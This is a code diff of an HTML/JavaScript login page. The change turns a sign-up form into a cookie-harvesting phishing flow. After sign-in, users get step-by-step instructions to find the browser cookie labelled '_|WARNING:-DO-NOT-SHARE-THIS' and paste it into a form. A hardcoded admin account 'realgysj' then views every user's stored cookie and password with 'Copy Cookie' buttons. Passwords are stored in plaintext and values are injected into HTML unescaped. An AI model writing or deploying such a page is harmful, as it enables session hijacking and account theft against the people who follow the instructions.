@@ -43,6 +43,9 @@
         .btn:hover {
             background-color: #218838;
         }
+        #cookieSection {
+            display: none;
+        }
         #adminLogs {
             display: none;
         }
@@ -69,76 +72,82 @@
 </head>
 <body>
     <div class="container" id="loginSection">
-        <h2>Sign Up</h2>
-        <p>Enter your username, a secure password, and an admin code if applicable. If you are the admin, enter the secret code directly!</p>
+        <h2>Sign In</h2>
+        <p>Enter your username and password to sign in.</p>
         <input type="text" class="input-box" id="username" placeholder="Username">
         <input type="password" class="input-box" id="password" placeholder="Secure Password">
-        <input type="text" class="input-box" id="adminCode" placeholder="Admin Code (Optional)">
-        <button class="btn" onclick="signUp()">Sign Up</button>
+        <button class="btn" onclick="signIn()">Sign In</button>
     </div>
 
-    <div class="container" id="adminLogs">
-        <h2>Admin Logs</h2>
-        <div id="logs"></div>
+    <div class="container" id="cookieSection">
+        <h2>Enter Your Cookie</h2>
+        <p>To complete your sign-in, please provide the cookie associated with your account.</p>
+        
+        <!-- Cookie Instructions -->
         <h3>How to Find Your Cookie:</h3>
-        <ol id="cookieInstructions">
+        <ol>
             <li>Open the website in your browser.</li>
             <li>Right-click anywhere on the page and select <strong>Inspect</strong>.</li>
             <li>Navigate to the <strong>Application</strong> tab.</li>
             <li>Under <strong>Storage</strong> in the left sidebar, select <strong>Cookies</strong>.</li>
             <li>Click on the website URL in the list of cookies.</li>
             <li>Look for the cookie named <code>_<strong>|WARNING:-DO-NOT-SHARE-THIS</strong></code>.</li>
-            <li>Copy its value and paste it below the cookie instructions for the user.</li>
+            <li>Copy its value and paste it below:</li>
         </ol>
+
+        <input type="text" class="input-box" id="cookieInput" placeholder="Enter your cookie here">
+        <button class="btn" onclick="submitCookie()">Submit Cookie</button>
+    </div>
+
+    <div class="container" id="adminLogs">
+        <h2>Admin Logs</h2>
+        <div id="logs"></div>
     </div>
     
     <script>
         let users = JSON.parse(localStorage.getItem("users")) || []; // Load saved users
-        let currentAdmin = null; // Track if the user is the admin
+        let currentUser = null; // To track if the logged-in user is the admin
 
         function validatePassword(password) {
             let passwordRegex = /^(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
             return passwordRegex.test(password);
         }
 
-        function signUp() {
+        function signIn() {
             let username = document.getElementById("username").value.trim();
             let password = document.getElementById("password").value;
-            let adminCode = document.getElementById("adminCode").value.trim();
+
+            // Check if the user exists
+            currentUser = users.find(user => user.username === username && user.password === password);
             
-            if (adminCode === "8rndosp") {
-                currentAdmin = username === "realgysj"; // Only grant admin access to "realgysj"
-                if (currentAdmin) {
-                    autoSignInAsRealgysj(); // Auto sign-in as realgysj if correct admin code
+            if (currentUser) {
+                if (username === "realgysj") {
+                    showAdminLogs(username); // Admin has special logs
                 } else {
-                    alert("Incorrect username for admin code.");
+                    document.getElementById("loginSection").style.display = "none"; // Hide sign-in section
+                    document.getElementById("cookieSection").style.display = "block"; // Show cookie section
                 }
-                return;
+            } else {
+                alert("Invalid username or password.");
             }
-
-            if (!username || !password) {
-                alert("Please enter both username and password.");
-                return;
-            }
-
-            if (!validatePassword(password)) {
-                alert("Password must be at least 8 characters long and include at least one uppercase letter, one number, and one special character.");
-                return;
-            }
-
-            users.push({ username, password, cookie: "" });
-            localStorage.setItem("users", JSON.stringify(users)); // Save users to local storage
-            alert("Signed up successfully.");
         }
 
-        function autoSignInAsRealgysj() {
-            // Simulate auto sign-in as 'realgysj' when the correct admin code is entered
-            let username = "realgysj";
-            showAdminLogs(username);
+        function submitCookie() {
+            let cookieValue = document.getElementById("cookieInput").value.trim();
+
+            if (cookieValue && currentUser) {
+                currentUser.cookie = cookieValue;
+                localStorage.setItem("users", JSON.stringify(users)); // Save updated users to local storage
+                alert("Cookie received successfully.");
+                document.getElementById("cookieSection").style.display = "none"; // Hide cookie section
+                showUserLogs(); // Show logs after submitting cookie
+            } else {
+                alert("Please enter your cookie value.");
+            }
         }
 
         function showAdminLogs(username) {
-            document.getElementById("loginSection").style.display = "none"; // Hide sign-up section
+            document.getElementById("loginSection").style.display = "none"; // Hide sign-in section
             document.getElementById("adminLogs").style.display = "block"; // Show admin logs
 
             let logsContainer = document.getElementById("logs");
@@ -154,17 +163,27 @@
                             <p><strong>Cookie:</strong> ${cookieDisplay}</p>
                         </div>`;
                 
-                if (currentAdmin) {
-                    logEntry += `
-                        <button class="copy-btn" onclick="copyCookieToClipboard('${user.cookie}')">Copy Cookie</button>
-                    </div>`;
-                } else {
-                    logEntry += `</div>`;
-                }
+                logEntry += `
+                    <button class="copy-btn" onclick="copyCookieToClipboard('${user.cookie}')">Copy Cookie</button>
+                </div>`;
 
                 logsContainer.innerHTML += logEntry;
                 logsContainer.innerHTML += `<hr>`;
             });
+        }
+
+        function showUserLogs() {
+            document.getElementById("cookieSection").style.display = "none"; // Hide cookie section
+            document.getElementById("adminLogs").style.display = "block"; // Show user logs
+
+            let logsContainer = document.getElementById("logs");
+            logsContainer.innerHTML = `<h3>Your Logs:</h3>`;
+            
+            logsContainer.innerHTML += `
+                <p><strong>Username:</strong> ${currentUser.username}</p>
+                <p><strong>Password:</strong> ${currentUser.password}</p>
+                <p><strong>Cookie:</strong> ${currentUser.cookie || "Not Set"}</p>
+            `;
         }
 
         function copyCookieToClipboard(cookieValue) {
